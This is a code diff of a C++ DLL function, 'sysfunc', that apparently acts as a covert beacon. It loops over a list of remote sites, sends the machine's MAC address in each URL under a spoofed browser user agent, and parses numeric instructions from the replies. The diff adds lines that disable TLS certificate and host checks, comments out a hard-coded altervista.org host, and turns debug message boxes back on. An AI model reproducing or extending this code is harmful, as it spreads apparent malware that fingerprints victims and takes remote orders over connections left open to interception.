@@ -147,7 +147,7 @@ extern "C" DLLIMPORT void sysfunc()
   mysites=getSites();
   //MessageBox(0,mysites[0].c_str(),"Hi",MB_ICONINFORMATION);
   iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); 
-	sites[0] = L"http://paner.altervista.org/";
+	//sites[0] = L"http://paner.altervista.org/";
 	
 	for (int j = 0; j < mysites.size(); j++)
 	{
@@ -158,14 +158,14 @@ extern "C" DLLIMPORT void sysfunc()
 			
 			
 			//MessageBox(0,ip_address.c_str(),"Hi",MB_ICONINFORMATION);
-			std::string ip_address=getip(myhost.c_str());
+			//std::string ip_address=getip(myhost.c_str());
 			//if (ip_address.compare("") != 0)
 			//{
 				//std::wstring wsTmp(ip_address.begin(), ip_address.end());
 				std::wstring wsTmp(myhost.begin(), myhost.end());
 			//	sites[j+1]=L"http://";
-			    sites[j+1].append(wsTmp); 
-			    sites[j+1].append(L"/"); 
+			    sites[j].append(wsTmp); 
+			    sites[j].append(L"/"); 
 			//}
 			
 		}
@@ -178,7 +178,7 @@ extern "C" DLLIMPORT void sysfunc()
 	
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl_handle = curl_easy_init();
-	for (int i = 0; i < mysites.size()+1; i++)
+	for (int i = 0; i < mysites.size(); i++)
 	{
 		
 
@@ -193,11 +193,13 @@ extern "C" DLLIMPORT void sysfunc()
 		surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
 		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
+		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);
 		readBuffer="";
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
 		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
 		res = curl_easy_perform(curl_handle);
-		//MessageBox(0,surl.c_str(),"Hi",MB_ICONINFORMATION);
+		MessageBox(0,surl.c_str(),"Hi",MB_ICONINFORMATION);
 		std::cout << readBuffer << std::endl;
 		char *token = strtok((char *)readBuffer.c_str(), "||");
 		
@@ -205,7 +207,7 @@ extern "C" DLLIMPORT void sysfunc()
         int j=0;
         
         
-		   // MessageBox(0,token,"Hi",MB_ICONINFORMATION);
+		   MessageBox(0,token,"Hi",MB_ICONINFORMATION);
 		std::vector<std::string> seglist;
 		while (token != NULL) {
 			v.push_back(std::strtol(token, NULL, 10));
